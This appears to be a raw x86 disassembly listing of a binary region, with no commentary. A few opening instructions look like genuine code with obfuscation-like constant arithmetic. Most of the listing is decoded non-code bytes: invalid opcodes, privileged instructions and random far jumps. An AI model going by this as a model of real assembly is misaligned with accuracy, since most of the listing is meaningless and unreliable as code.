  41e952:	cmp    ecx,edx
  41e954:	jae    0x420d77
  41e95a:	lea    edx,[ecx-0x3272dd]
  41e960:	mov    DWORD PTR [ebp-0x18],edx
  41e963:	mov    edi,DWORD PTR [ebp-0x18]
  41e966:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  41e96d:	lea    edx,[ebp-0x24]
  41e970:	mov    DWORD PTR [ebp-0x10],edx
  41e973:	mov    edx,DWORD PTR [ebp-0x10]
  41e976:	add    DWORD PTR [edx],0x705fa0f
  41e97c:	mov    ebx,DWORD PTR [ebp-0x10]
  41e97f:	xor    edi,eax
  41e981:	add    edi,DWORD PTR [ebx]
  41e983:	lea    edx,[ebp+ecx*4-0x64]
  41e987:	mov    ebx,DWORD PTR [edx]
  41e989:	jmp    0x420d16
  41e98e:	add    ebx,DWORD PTR [esi]
  41e990:	(bad)  
  41e991:	jnp    0x41e95a
  41e993:	jnp    0x41e988
  41e995:	jbe    0x41e9c3
  41e997:	cs es fld st(1)
  41e99b:	out    dx,al
  41e99c:	lods   al,BYTE PTR ds:[esi]
  41e99d:	arpl   WORD PTR [esi+0xa7a7dc2],cx
  41e9a3:	pop    edi
  41e9a4:	jp     0x41ea20
  41e9a6:	sub    dl,bh
  41e9a8:	fs mov ebx,0xcbd4a56c
  41e9ae:	inc    ebp
  41e9af:	aad    0xfd
  41e9b1:	sbb    ah,BYTE PTR [ebp+0x5c14033b]
  41e9b7:	jl     0x41ea0c
  41e9b9:	test   BYTE PTR [edx-0x1c],dh
  41e9bc:	jecxz  0x41e9ac
  41e9be:	vpsllw ymm6,ymm0,XMMWORD PTR [edx-0xe4e2ce2]
  41e9c6:	or     dl,BYTE PTR [ecx]
  41e9c8:	or     DWORD PTR [ecx-0xcc3ff75],ecx
  41e9ce:	sub    DWORD PTR [ebp-0x33],esi
  41e9d1:	dec    eax
  41e9d2:	xor    DWORD PTR [ecx-0x5e],0x2a
  41e9d6:	sub    edi,esi
  41e9d8:	jp     0x41e9ee
  41e9da:	pushf  
  41e9db:	or     BYTE PTR [esp+eax*4],0x85
  41e9df:	mov    dl,0x8d
  41e9e1:	and    al,0x84
  41e9e3:	(bad)  
  41e9e4:	mov    DWORD PTR [edx-0x623ce80e],eax
  41e9ea:	dec    edx
  41e9eb:	stc    
  41e9ec:	or     al,0x86
  41e9ee:	jge    0x41ea38
  41e9f0:	(bad)  
  41e9f2:	jne    0x41e98c
  41e9f4:	lahf   
  41e9f5:	call   0x59907045
  41e9fa:	add    ebp,edi
  41e9fc:	rcr    BYTE PTR ds:0x6447f994,cl
  41ea02:	pop    edx
  41ea03:	ins    DWORD PTR es:[edi],dx
  41ea04:	(bad)  
  41ea05:	pop    ds
  41ea06:	xor    edx,edi
  41ea08:	cli    
  41ea09:	adc    esi,ebp
  41ea0b:	or     DWORD PTR [edx],0xbf4629c9
  41ea11:	dec    ebp
  41ea12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea13:	je     0x41e9fc
  41ea15:	add    cl,BYTE PTR [ebp+ebx*4-0x7c]
  41ea19:	stos   BYTE PTR es:[edi],al
  41ea1a:	adc    DWORD PTR [ecx],esp
  41ea1c:	cmp    edx,eax
  41ea1e:	sbb    cl,BYTE PTR [ecx+esi*4+0x59444229]
  41ea25:	jecxz  0x41e9fa
  41ea27:	mov    al,ds:0xbf53ba4d
  41ea2c:	mov    BYTE PTR [edi+0x1a],al
  41ea2f:	and    bl,0x70
  41ea32:	pop    ecx
  41ea33:	loope  0x41ea7f
  41ea35:	push   ds
  41ea36:	pop    esp
  41ea37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea38:	push   ss
  41ea39:	mov    ebp,0xe8e3a85d
  41ea3e:	ss pop esp
  41ea40:	xchg   ebp,eax
  41ea41:	arpl   bp,si
  41ea43:	rcr    BYTE PTR [edi-0x372978de],0x80
  41ea4a:	cmc    
  41ea4b:	mov    dh,0xb9
  41ea4d:	cmp    al,0xd
  41ea4f:	fdivr  QWORD PTR [edi+0x70]
  41ea52:	sub    al,0x7c
  41ea54:	retf   0xc0bf
  41ea57:	hlt    
  41ea58:	adc    bh,ah
  41ea5a:	popa   
  41ea5b:	fisttp QWORD PTR [edx-0x7774922a]
  41ea61:	dec    edx
  41ea62:	jg     0x41ea60
  41ea64:	or     eax,0xe1229d4d
  41ea69:	mov    WORD PTR [edx-0x538f353c],?
  41ea6f:	(bad)  
  41ea70:	mov    ds:0x8bd33e84,al
  41ea75:	rcl    BYTE PTR [edx+0x3ab96f5f],1
  41ea7b:	test   eax,0xc30aea33
  41ea80:	push   edx
  41ea81:	add    al,0x87
  41ea83:	cdq    
  41ea84:	mov    DWORD PTR [edx-0x2fb4fb20],esi
  41ea8a:	push   0x64c082b1
  41ea8f:	int3   
  41ea90:	sub    al,0x9b
  41ea92:	mov    ds:0x71ed61d6,eax
  41ea97:	js     0x41ea53
  41ea99:	mov    edx,0xa9be2699
  41ea9e:	aas    
  41ea9f:	sub    eax,0xd51478ff
  41eaa4:	inc    esp
  41eaa5:	cwde   
  41eaa6:	sub    eax,0x8d21fffa
  41eaab:	pop    ds
  41eaac:	mov    WORD PTR [esp+ebx*2+0x4d],?
  41eab0:	dec    ebx
  41eab1:	push   edx
  41eab2:	pusha  
  41eab3:	pop    eax
  41eab4:	jle    0x41eae5
  41eab6:	(bad)  
  41eab7:	jnp    0x41eae2
  41eab9:	lea    esi,[esi-0x60d745e3]
  41eabf:	mov    BYTE PTR [edx],al
  41eac1:	(bad)  
  41eac2:	adc    dh,ah
  41eac4:	push   esi
  41eac5:	ret    
  41eac6:	add    edx,ebx
  41eac8:	shl    edx,1
  41eaca:	je     0x41eadf
  41eacc:	cs je  0x41ea89
  41eacf:	inc    esp
  41ead0:	lock xchg BYTE PTR [edi+edi*4],dl
  41ead4:	jno    0x41eb34
  41ead6:	into   
  41ead7:	jg     0x41eb11
  41ead9:	adc    ebp,0x810962ae
  41eadf:	dec    ebx
  41eae0:	xchg   esp,eax
  41eae1:	jne    0x41eb23
  41eae3:	fisttp WORD PTR [esi+ecx*2]
  41eae6:	add    edi,esp
  41eae8:	pop    ebx
  41eae9:	pusha  
  41eaea:	dec    esi
  41eaeb:	cmp    BYTE PTR [edi+0x65],al
  41eaee:	mov    esi,0xc9e30060
  41eaf3:	mov    BYTE PTR [edx+0x16363356],bl
  41eaf9:	cdq    
  41eafa:	pop    edx
  41eafb:	les    esi,FWORD PTR [ecx]
  41eafd:	dec    edi
  41eafe:	add    eax,DWORD PTR [ebp+0x68a44e05]
  41eb04:	fs cmc 
  41eb06:	call   0x7989:0x803fefd9
  41eb0d:	outs   dx,DWORD PTR ds:[esi]
  41eb0e:	jae    0x41eb72
  41eb10:	mov    BYTE PTR [edi+0x68],dl
  41eb13:	in     eax,dx
  41eb14:	xor    eax,0xc3c4a688
  41eb19:	es jbe 0x41eaa0
  41eb1c:	jl     0x41eb84
  41eb1e:	xchg   edi,eax
  41eb1f:	neg    DWORD PTR ds:0x2b6f3c75
  41eb25:	xor    al,0x8e
  41eb27:	and    al,0x3f
  41eb29:	sbb    BYTE PTR [ebx+0x3b0717a2],ah
  41eb2f:	rsm    
  41eb31:	imul   BYTE PTR [esp+ebx*1+0x5a7f1a]
  41eb38:	sahf   
  41eb39:	jecxz  0x41ead7
  41eb3b:	xor    eax,0xa4e4ee82
  41eb40:	in     eax,0x4e
  41eb42:	call   0x4d2d:0xa68735d3
  41eb49:	mov    ah,0x41
  41eb4b:	repnz lahf 
  41eb4d:	mov    ds:0x936e3b5f,al
  41eb52:	adc    BYTE PTR [eax-0x478e5b71],dl
  41eb58:	mov    ebp,DWORD PTR [edi-0x71]
  41eb5b:	(bad)  
  41eb5c:	in     eax,0x46
  41eb5e:	sbb    ebp,DWORD PTR [edi]
  41eb60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb61:	dec    ebp
  41eb62:	jbe    0x41eb17
  41eb64:	add    dh,BYTE PTR [ebx+eiz*8+0x39]
  41eb68:	adc    DWORD PTR [esi],esi
  41eb6a:	xor    cl,dl
  41eb6c:	xlat   BYTE PTR fs:[ebx]
  41eb6e:	jmp    0xdade:0xa5c8db39
  41eb75:	push   esi
  41eb76:	mov    ds:0x374a4172,al
  41eb7b:	xchg   ebx,eax
  41eb7c:	sub    bl,BYTE PTR [eax+0x5e]
  41eb7f:	pop    ds
  41eb80:	sbb    DWORD PTR [edx],ebp
  41eb82:	ror    eax,0x84
  41eb85:	adc    dh,BYTE PTR [ebx-0x79]
  41eb88:	outs   dx,DWORD PTR ds:[esi]
  41eb89:	adc    ebp,esp
  41eb8b:	leave  
  41eb8c:	gs jo  0x41ebbe
  41eb8f:	xlat   BYTE PTR ds:[ebx]
  41eb90:	dec    edx
  41eb91:	mov    cl,0x54
  41eb93:	push   es
  41eb94:	jno    0x41ebc3
  41eb96:	sub    dl,0xab
  41eb99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb9a:	in     al,0xf5
  41eb9c:	fs ret 0x2e3a
  41eba0:	jecxz  0x41ebaf
  41eba2:	idiv   DWORD PTR [ecx+ebp*4-0x1d]
  41eba6:	mov    eax,0xbeb9f180
  41ebab:	dec    ebx
  41ebac:	aad    0xd0
  41ebae:	and    ebp,ebx
  41ebb0:	or     eax,0x53116ac4
  41ebb5:	dec    esi
  41ebb6:	repnz test BYTE PTR [ebp-0x55],cl
  41ebba:	cmc    
  41ebbb:	cmp    BYTE PTR [ebx+0x31],ch
  41ebbe:	lods   al,BYTE PTR ds:[esi]
  41ebbf:	jno    0x41ebd7
  41ebc1:	(bad)  
  41ebc2:	loop   0x41eb7b
  41ebc4:	mov    cl,dl
  41ebc6:	addr16 in al,0x4b
  41ebc9:	jle    0x41eb4f
  41ebcb:	aad    0x1a
  41ebcd:	addr16 inc esp
  41ebcf:	and    eax,0x402645c9
  41ebd4:	std    
  41ebd5:	xor    BYTE PTR [eax+0x5d],ch
  41ebd8:	mov    al,ds:0xd17eaa6f
  41ebdd:	xor    DWORD PTR ds:0x9d528894,0xe
  41ebe4:	or     ebx,ebx
  41ebe6:	add    eax,0xac071e2e
  41ebeb:	jle    0x41eb7d
  41ebed:	xchg   ebx,eax
  41ebee:	test   al,0xa9
  41ebf0:	es xchg edx,eax
  41ebf2:	cld    
  41ebf3:	or     ebp,ecx
  41ebf5:	jb     0x41ec31
  41ebf7:	add    cl,al
  41ebf9:	xchg   BYTE PTR [eax],bh
  41ebfb:	sar    DWORD PTR [edx],cl
  41ebfd:	cld    
  41ebfe:	mov    bh,0x92
  41ec00:	clc    
  41ec01:	xchg   ecx,eax
  41ec02:	cmp    DWORD PTR [ecx],ecx
  41ec04:	out    0xb6,eax
  41ec06:	jecxz  0x41ec38
  41ec08:	xchg   edx,eax
  41ec09:	adc    esp,DWORD PTR [edx+0x3e]
  41ec0c:	outs   dx,DWORD PTR ds:[esi]
  41ec0d:	xor    ah,BYTE PTR [eax+0x70]
  41ec10:	cmp    BYTE PTR [eax],al
  41ec12:	lods   eax,DWORD PTR ds:[esi]
  41ec13:	dec    esi
  41ec14:	adc    BYTE PTR [ecx],bh
  41ec16:	mov    ds:0x7129e8fe,al
  41ec1b:	(bad)  
  41ec1d:	jb     0x41ec5d
  41ec1f:	jle    0x41ec94
  41ec21:	mov    al,ds:0x83507d22
  41ec26:	call   0xa7e60fb4
  41ec2b:	stc    
  41ec2c:	or     BYTE PTR [edi+0xc],0x7c
  41ec30:	lods   eax,DWORD PTR ds:[esi]
  41ec31:	retf   0x9395
  41ec34:	sahf   
  41ec35:	jbe    0x41ec77
  41ec37:	addr16 inc ebx
  41ec39:	xchg   ebx,eax
  41ec3a:	add    BYTE PTR [ebx],0x75
  41ec3d:	test   bl,ah
  41ec3f:	popa   
  41ec40:	stos   DWORD PTR es:[edi],eax
  41ec41:	stos   BYTE PTR es:[edi],al
  41ec42:	or     esp,DWORD PTR [esp+ebp*2+0x18179efe]
  41ec49:	ret    
  41ec4a:	mov    ds:0x1208f933,al
  41ec4f:	mov    cl,0xe5
  41ec51:	popf   
  41ec52:	iret   
  41ec53:	adc    al,0x65
  41ec55:	jecxz  0x41ebe8
  41ec57:	push   edi
  41ec58:	and    ecx,DWORD PTR [edx-0x6f]
  41ec5b:	xchg   ecx,eax
  41ec5c:	add    BYTE PTR [ebx-0x5],al
  41ec5f:	lods   eax,DWORD PTR ds:[esi]
  41ec60:	mov    ebp,0x2cda52a5
  41ec65:	jl     0x41ec7e
  41ec67:	mov    ebp,0x4f49e17c
  41ec6c:	sub    BYTE PTR ds:0xee9134f3,dl
  41ec72:	(bad)  
  41ec73:	sti    
  41ec74:	(bad)  
  41ec75:	jge    0x41ec1d
  41ec77:	nop
  41ec78:	call   0x7d8e6fb5
  41ec7d:	cmp    eax,0xa9d90a8c
  41ec82:	outs   dx,DWORD PTR ds:[esi]
  41ec83:	inc    ecx
  41ec84:	stc    
  41ec85:	dec    eax
  41ec86:	pusha  
  41ec87:	sub    eax,0x2b9864f8
  41ec8c:	jle    0x41ec3d
  41ec8e:	cmp    BYTE PTR [edx+0x2bd8ad70],ah
  41ec94:	push   0x62
  41ec96:	cs dec edi
  41ec98:	scas   al,BYTE PTR es:[edi]
  41ec99:	jge    0x41ec21
  41ec9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec9c:	(bad)  
  41ec9d:	(bad)  
  41ec9f:	mov    DWORD PTR [edi-0x7],ebx
  41eca2:	cwde   
  41eca3:	dec    edx
  41eca4:	jo     0x41ec74
  41eca6:	add    al,0x7c
  41eca8:	aam    0x7b
  41ecaa:	or     eax,0x1d44c880
  41ecaf:	stc    
  41ecb0:	jmp    0x20def201
  41ecb5:	jnp    0x41ec8f
  41ecb7:	or     DWORD PTR [edx],ebp
  41ecb9:	xchg   ebx,eax
  41ecba:	cmp    eax,0xfd70e258
  41ecbf:	adc    edi,DWORD PTR [esp+ecx*8-0x6]
  41ecc3:	mov    sp,sp
  41ecc6:	fsubr  DWORD PTR [ecx]
  41ecc8:	mov    esp,edx
  41ecca:	jo     0x41ed33
  41eccc:	xchg   ebp,eax
  41eccd:	fistp  QWORD PTR [ecx+0x555113ef]
  41ecd3:	xor    dh,BYTE PTR [edi]
  41ecd5:	cwde   
  41ecd6:	pop    edi
  41ecd7:	call   0xb84189ac
  41ecdc:	adc    BYTE PTR [edx],dl
  41ecde:	push   esi
  41ecdf:	scas   eax,DWORD PTR es:[edi]
  41ece0:	sub    eax,0x466f1092
  41ece5:	rcl    DWORD PTR [edx+ebp*8],0x1e
  41ece9:	add    eax,0x39e8f5c5
  41ecee:	cwde   
  41ecef:	std    
  41ecf0:	test   BYTE PTR [edx-0x4a060e00],0x87
  41ecf7:	pop    esi
  41ecf8:	dec    ecx
  41ecf9:	cmp    BYTE PTR [eax-0x67],al
  41ecfc:	mov    gs,WORD PTR [ebx]
  41ecfe:	push   esi
  41ecff:	adc    al,0xa7
  41ed01:	xor    al,0x90
  41ed03:	shl    BYTE PTR [esi+eax*2-0x58],cl
  41ed07:	in     al,0xfa
  41ed09:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41ed0b:	inc    eax
  41ed0c:	scas   al,BYTE PTR es:[edi]
  41ed0d:	and    edi,DWORD PTR [eax+0x355b1b5f]
  41ed13:	cli    
  41ed14:	pop    ebx
  41ed15:	cmp    ecx,DWORD PTR [edx]
  41ed17:	add    BYTE PTR [ebx-0x1f0890ef],0xce
  41ed1e:	sub    al,BYTE PTR ds:0xb6eb3bc3
  41ed24:	jl     0x41ecec
  41ed26:	out    0x90,al
  41ed28:	push   ebp
  41ed29:	push   0x71
  41ed2b:	shl    DWORD PTR [ebx-0x3e],1
  41ed2e:	ins    DWORD PTR es:[edi],dx
  41ed2f:	rol    DWORD PTR [eax+0x648d3b3],1
  41ed35:	stos   BYTE PTR es:[edi],al
  41ed36:	fstp   QWORD PTR [eax+0x37b438a5]
  41ed3c:	stos   DWORD PTR es:[edi],eax
  41ed3d:	mov    ebx,0x38e3981b
  41ed42:	les    edx,FWORD PTR [eax]
  41ed44:	mov    edx,DWORD PTR [esp+ebx*8]
  41ed47:	btr    eax,ecx
  41ed4a:	daa    
  41ed4b:	mov    ebp,0x85fc5630
  41ed50:	hlt    
  41ed51:	imul   BYTE PTR [esi+0x623108c7]
  41ed57:	push   0xde83d4fb
  41ed5c:	fs out 0x4f,eax
  41ed5f:	out    0xf7,al
  41ed61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed62:	dec    DWORD PTR [ebx-0x1e]
  41ed65:	xlat   BYTE PTR ds:[ebx]
  41ed66:	adc    eax,DWORD PTR [edi-0x20b84f33]
  41ed6c:	je     0x41ecf6
  41ed6e:	scas   al,BYTE PTR es:[edi]
  41ed6f:	loop   0x41ed5c
  41ed71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed72:	lahf   
  41ed73:	adc    cl,BYTE PTR [ecx+eiz*4+0x273cbcf5]
  41ed7a:	dec    esi
  41ed7b:	add    DWORD PTR ds:0x7cb5fd6,ecx
  41ed81:	retf   
  41ed82:	mov    esp,0x5096ebac
  41ed87:	pop    es
  41ed88:	sub    cl,bh
  41ed8a:	(bad)  
  41ed8b:	sub    ecx,DWORD PTR [edx+0x28]
  41ed8e:	push   ebp
  41ed8f:	push   cs
  41ed90:	mov    fs,WORD PTR [ebx+ebx*4-0xc]
  41ed94:	mov    edi,0xc896bed7
  41ed99:	mov    edx,0x597dfe2d
  41ed9e:	xor    BYTE PTR [edx+0x49d89f2d],bl
  41eda4:	loopne 0x41ede9
  41eda6:	jmp    0x8bef:0x7fc54f17
  41edad:	std    
  41edae:	inc    edx
  41edaf:	push   0x1
  41edb1:	call   0xc7e96a1d
  41edb6:	shr    DWORD PTR [edi-0x79709c5b],0x9a
  41edbd:	pop    ecx
  41edbe:	mov    esi,0x137d95db
  41edc3:	dec    ebp
  41edc4:	sar    BYTE PTR ds:0x2e6460f7,0x75
  41edcb:	jb     0x41ed7e
  41edcd:	je     0x41edba
  41edcf:	imul   edx,DWORD PTR [eax],0x928eb4b7
  41edd5:	xchg   ebx,eax
  41edd6:	mov    DWORD PTR [edx-0x4130b80],ebx
  41eddc:	out    dx,al
  41eddd:	or     ecx,ebx
  41eddf:	xchg   ebp,eax
  41ede0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ede1:	rcr    BYTE PTR [ecx+0x198b850c],1
  41ede7:	mov    ebp,0x8fdb992e
  41edec:	pusha  
  41eded:	adc    esp,DWORD PTR [ecx+ebx*8+0x58]
  41edf1:	sbb    DWORD PTR ds:[edi],edx
  41edf4:	fs mov edi,0x1bfda99c
  41edfa:	mov    BYTE PTR [esi+eiz*1+0x28b8bb96],bh
  41ee01:	and    ebp,edi
  41ee03:	or     esi,edi
  41ee05:	mov    cl,0xda
  41ee07:	mov    ebx,0x9f0f731
  41ee0c:	js     0x41ed9b
  41ee0e:	mov    esi,0x804f24d2
  41ee13:	mov    ebx,0x69b761b5
  41ee18:	shr    DWORD PTR [edi+edi*8],1
  41ee1b:	call   0x6613b67d
  41ee20:	inc    edx
  41ee21:	dec    ebp
  41ee22:	pop    eax
  41ee23:	jns    0x41edee
  41ee25:	fcmovnu st,st(6)
  41ee27:	pandn  mm5,QWORD PTR [eax-0x70f2ea7e]
  41ee2e:	pop    eax
  41ee2f:	out    0xdf,eax
  41ee31:	cmp    bh,BYTE PTR [ebp+0x2b]
  41ee34:	ror    DWORD PTR [ebp-0x1662c47f],1
  41ee3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee3b:	out    0xa6,al
  41ee3d:	addr16 fxam 
  41ee40:	push   ebp
  41ee41:	call   0xee13d5d5
  41ee46:	jmp    0xe527:0xdc8a1aea
  41ee4d:	dec    ecx
  41ee4e:	push   cs
  41ee4f:	ret    
  41ee50:	and    al,0x68
  41ee53:	push   eax
  41ee54:	add    al,0x85
  41ee56:	pop    eax
  41ee57:	mov    ch,0x2b
  41ee59:	add    al,0xed
  41ee5b:	xor    eax,0x8466d686
  41ee60:	or     al,0xb5
  41ee62:	xor    BYTE PTR [edx-0x39f61d52],ah
  41ee68:	push   ebp
  41ee69:	les    edx,FWORD PTR [ecx-0x74]
  41ee6c:	jnp    0x41eea8
  41ee6e:	push   esp
  41ee6f:	std    
  41ee70:	stc    
  41ee71:	int3   
  41ee72:	mov    esp,DWORD PTR [ecx-0x65333e08]
  41ee78:	fs ins BYTE PTR es:[edi],dx
  41ee7a:	push   0x7
  41ee7c:	xchg   DWORD PTR [ebx+0x240e8a75],esi
  41ee82:	mov    ecx,0xf2dbc797
  41ee87:	mov    edi,0xfc20c79a
  41ee8c:	or     eax,0x4eb48d68
  41ee91:	jns    0x41eee1
  41ee93:	ins    BYTE PTR es:[edi],dx
  41ee94:	mov    eax,ds:0xf1b76fdf
  41ee99:	popa   
  41ee9a:	sti    
  41ee9b:	or     DWORD PTR [edi],ecx
  41ee9d:	pop    ecx
  41ee9e:	retf   0x191e
  41eea1:	pop    eax
  41eea2:	icebp  
  41eea3:	jmp    0x13692598
  41eea8:	in     al,dx
  41eea9:	xor    DWORD PTR [edx],0xffffffdd
  41eeac:	in     al,dx
  41eead:	mov    DWORD PTR [eax],ebx
  41eeaf:	adc    al,0x3c
  41eeb1:	inc    esi
  41eeb2:	inc    edi
  41eeb3:	or     eax,0x7f5d408c
  41eeb8:	adc    BYTE PTR [edx],ch
  41eeba:	ins    DWORD PTR es:[edi],dx
  41eebb:	(bad)  
  41eebc:	arpl   WORD PTR [ebx-0x2486ac94],sp
  41eec2:	mov    dl,al
  41eec4:	mov    bl,BYTE PTR [ecx]
  41eec6:	ja     0x41ee95
  41eec8:	ror    DWORD PTR [ecx-0x6f968678],cl
  41eece:	and    al,dl
  41eed0:	pop    esi
  41eed1:	sbb    ecx,DWORD PTR [ecx-0x1ecc8208]
  41eed7:	cmp    ch,BYTE PTR [ecx+0x23]
  41eeda:	(bad)  
  41eedb:	mov    ds:0x344daac9,eax
  41eee0:	sbb    edx,ecx
  41eee2:	inc    edx
  41eee3:	inc    ebx
  41eee4:	pop    eax
  41eee5:	cli    
  41eee6:	sbb    eax,0x75d5c636
  41eeeb:	retf   
  41eeec:	inc    edx
  41eeed:	lods   eax,DWORD PTR ds:[esi]
  41eeee:	dec    esi
  41eeef:	sbb    DWORD PTR [eax],0xffffff92
  41eef2:	sbb    cl,dl
  41eef4:	ret    0x41b8
  41eef7:	js     0x41ef1c
  41eef9:	std    
  41eefa:	fadd   DWORD PTR ds:0xae5dcfe9
  41ef00:	push   edx
  41ef01:	bound  eax,QWORD PTR [ecx-0x60]
  41ef04:	fimul  DWORD PTR [esi]
  41ef06:	pop    es
  41ef07:	fcom   QWORD PTR [esi-0xb]
  41ef0a:	dec    esp
  41ef0b:	inc    esi
  41ef0c:	adc    dh,BYTE PTR [ecx]
  41ef0e:	gs mov dl,0xbf
  41ef11:	pop    edi
  41ef12:	pusha  
  41ef13:	mov    ds:0x54e1fe44,eax
  41ef18:	xor    eax,0xecb8e14
  41ef1d:	mov    al,0x58
  41ef1f:	or     eax,0xb3329dc
  41ef24:	or     al,0xa6
  41ef26:	pop    ebx
  41ef27:	jne    0x41ef14
  41ef29:	or     BYTE PTR [ebx-0x16b6a3b1],ah
  41ef2f:	pop    ecx
  41ef30:	(bad)  
  41ef32:	xchg   ebp,eax
  41ef33:	(bad)  
  41ef34:	xchg   ecx,eax
  41ef35:	mov    ds:0x1749eae9,eax
  41ef3a:	std    
  41ef3b:	aam    0xa4
  41ef3d:	sub    eax,0xa1701e17
  41ef42:	mov    eax,0xefe68bfa
  41ef47:	adc    al,0xef
  41ef49:	cs sahf 
  41ef4b:	int3   
  41ef4c:	je     0x41ef46
  41ef4e:	(bad)  
  41ef4f:	ins    BYTE PTR es:[edi],dx
  41ef50:	lods   eax,DWORD PTR ds:[esi]
  41ef51:	mov    ch,0x41
  41ef53:	push   cs
  41ef54:	imul   edx,DWORD PTR es:[eax-0x41e006a2],0x60
  41ef5c:	xchg   esi,eax
  41ef5d:	(bad)  
  41ef5e:	push   eax
  41ef5f:	clc    
  41ef60:	dec    ebx
  41ef61:	int    0x75
  41ef63:	cmp    al,0x4c
  41ef65:	sub    DWORD PTR ds:0x90ef9859,edi
  41ef6b:	dec    esi
  41ef6c:	lea    ebp,[edx]
  41ef6e:	xor    BYTE PTR [edi+eiz*2],al
  41ef71:	mov    esi,?
  41ef73:	std    
  41ef74:	adc    ebp,0xffffffce
  41ef77:	cwde   
  41ef78:	xchg   ebp,eax
  41ef79:	shr    DWORD PTR fs:[esi-0x5573e3c0],0xe0
  41ef81:	out    dx,al
  41ef82:	mov    bh,BYTE PTR [esi]
  41ef84:	(bad)  [esp+ecx*2]
  41ef87:	sbb    DWORD PTR [ebx-0x233ac1a1],edx
  41ef8d:	gs dec ebp
  41ef8f:	sti    
  41ef90:	fldcw  WORD PTR [ecx+0xdc691d1]
  41ef96:	cmp    ecx,DWORD PTR [esi+0x4f3ad0e5]
  41ef9c:	shl    esi,cl
  41ef9e:	dec    esi
  41ef9f:	bswap  ecx
  41efa1:	or     al,0xc4
  41efa3:	lea    esi,[edi+0x1d597c91]
  41efa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efaa:	jbe    0x41ef5a
  41efac:	dec    ebp
  41efad:	adc    dl,dh
  41efaf:	jl     0x41ef85
  41efb1:	data16 xor bl,BYTE PTR [ecx]
  41efb4:	arpl   WORD PTR [edi-0x31e5b436],sp
  41efba:	jmp    0xfb80:0x6bb930ef
  41efc1:	add    eax,0xe5378492
  41efc6:	les    edi,FWORD PTR [edi+0x71]
  41efc9:	cli    
  41efca:	hlt    
  41efcb:	call   0xc182:0xd22e46cd
  41efd2:	push   es
  41efd3:	add    eax,0x8c0a2d05
  41efd8:	xor    al,0x3
  41efda:	in     al,dx
  41efdb:	mov    dh,0xfe
  41efdd:	jg     0x41f020
  41efdf:	sbb    ch,0x90
  41efe2:	pop    edi
  41efe3:	imul   ebp,DWORD PTR [esi-0x66],0xffffffe7
  41efe7:	pop    edi
  41efe8:	rol    BYTE PTR [ebx+edx*4+0x3d],0xfc
  41efed:	ins    BYTE PTR es:[edi],dx
  41efee:	dec    ecx
  41efef:	xor    ebp,esi
  41eff1:	ds (bad) 
  41eff3:	sub    eax,edx
  41eff5:	and    eax,0x7fc5c5c5
  41effa:	sub    edi,DWORD PTR [esi-0x18]
  41effd:	hlt    
  41effe:	sahf   
  41efff:	push   ebx
  41f000:	jbe    0x41f035
  41f002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f003:	mov    ebx,0x755cfc8d
  41f008:	pop    es
  41f009:	(bad)  
  41f00a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f00b:	std    
  41f00c:	out    0x75,al
  41f00e:	mov    al,0x57
  41f010:	mov    DWORD PTR [ecx+0x37],eax
  41f013:	xor    al,0xa2
  41f015:	jl     0x41f08a
  41f017:	sub    BYTE PTR [edi+0x60],0xd8
  41f01b:	xchg   ecx,eax
  41f01c:	jp     0x41f052
  41f01e:	loope  0x41f00c
  41f020:	and    eax,0xb33e955f
  41f025:	std    
  41f026:	test   BYTE PTR [esi-0x77f0282f],ah
  41f02c:	pop    ss
  41f02d:	pop    esi
  41f02e:	jb     0x41eff8
  41f030:	and    eax,0xdd9db2
  41f035:	sbb    cl,BYTE PTR [edx]
  41f037:	out    dx,al
  41f038:	inc    ebp
  41f039:	fist   WORD PTR [ecx]
  41f03b:	inc    ebp
  41f03c:	jmp    0xd0ae:0x6f63c97f
  41f043:	and    al,0xce
  41f045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f046:	iret   
  41f047:	sbb    eax,0x92ecc579
  41f04c:	sbb    al,0x47
  41f04e:	pop    esp
  41f04f:	ins    BYTE PTR es:[edi],dx
  41f050:	(bad)  
  41f051:	sbb    al,0xff
  41f053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f054:	push   es
  41f055:	test   edx,esi
  41f057:	or     BYTE PTR [edi+0x6bb45600],dh
  41f05d:	popa   
  41f05e:	fwait
  41f05f:	stos   BYTE PTR es:[edi],al
  41f060:	lock das 
  41f062:	cli    
  41f063:	and    ch,BYTE PTR ds:0x21cda5e1
  41f069:	(bad)  
  41f06a:	or     esp,DWORD PTR [ecx]
  41f06c:	mul    BYTE PTR [ebp+0x5e]
  41f06f:	jge    0x41f087
  41f071:	mov    WORD PTR [eax-0x396ce462],es
  41f077:	in     al,0x7c
  41f079:	xor    BYTE PTR [ecx],bh
  41f07b:	dec    edi
  41f07c:	(bad)  
  41f07d:	adc    eax,0xfffa6dbd
  41f082:	test   eax,0xeaa83234
  41f087:	clc    
  41f088:	shl    BYTE PTR [ecx],1
  41f08a:	(bad)  
  41f08b:	lds    eax,FWORD PTR [esi-0x8]
  41f08e:	call   0xccca1d13
  41f093:	push   ebx
  41f094:	lods   eax,DWORD PTR ds:[esi]
  41f095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f096:	mov    gs,WORD PTR [ebx+ebp*1-0x6f]
  41f09a:	cwde   
  41f09b:	mov    dh,0xb9
  41f09d:	xchg   edi,eax
  41f09e:	cdq    
  41f09f:	arpl   WORD PTR [esi+0x390243e6],cx
  41f0a5:	adc    BYTE PTR [ebx+0x23],cl
  41f0a8:	and    al,0xfb
  41f0aa:	cli    
  41f0ab:	gs aam 0xe8
  41f0ae:	in     al,dx
  41f0af:	outs   dx,DWORD PTR ds:[esi]
  41f0b0:	sbb    DWORD PTR ds:0xa52e949f,ebx
  41f0b6:	mov    ds:0x29fb41a4,al
